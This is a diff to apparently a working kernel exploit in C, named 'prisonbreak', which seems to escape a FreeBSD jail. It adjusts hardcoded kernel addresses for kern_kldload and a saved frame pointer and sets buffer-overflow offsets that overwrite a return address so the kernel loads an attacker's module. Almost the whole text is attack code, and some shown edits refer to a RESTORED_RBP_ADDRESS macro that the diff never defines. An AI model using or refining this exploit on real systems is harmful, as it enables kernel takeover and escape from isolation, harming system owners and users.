@@ -21,7 +21,11 @@
 #define NUM_CARP_IFS 12
 #define IF_NAME "epair100b"
 
-#define KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
+// #define DEBUG_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0
+#define PRODUCTION_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0 - 1000
+
+// #define DEBUG_KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
+#define PRODUCTION_KERN_KLDLOAD_ADDRESS 0xffffffff80b3db70
 
 typedef struct synchdr {
   u_32_t sm_magic; /* magic */
@@ -215,24 +219,31 @@ void* prisonbreak(void* arg) {
 
   // Overwrite the address where kern_kldload is going to read the td argument
   int td_offset = 2872;
+  // int td_offset = 2872 - 24;
   ptr = (unsigned long*)((char*)header + td_offset);
+  // *ptr = 0x2222222222222222;
   *ptr = get_td();
 
   // Overwrite the address where kern_kldload is going to read the string
   // containing our custom kernel module path
   int kernel_module_path_offset = 2864;
+  // int kernel_module_path_offset = 2864 + 8;
   ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
   *ptr = (unsigned long)kernel_module_path;
+  // *ptr = 0x3333333333333333;
+  // *ptr = (unsigned long)kernel_module_path;
 
   // Overwrite the address where kern_kldload is going to read the fileid
   int fileid_offset = 2840;
+  // int fileid_offset = 2840 + 23;
   ptr = (unsigned long*)((char*)header + fileid_offset);
+  // *ptr = 0x4444444444444444;
   *ptr = 0;
 
   // Restore $rbp
   int rbp_offset = 2880;
   ptr = (unsigned long*)((char*)header + rbp_offset);
-  *ptr = 0xfffffe0070e09cc0;
+  *ptr = RESTORED_RBP_ADDRESS;
 
   // Overwrite the return address to jump into something we can use, e.g.
   // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
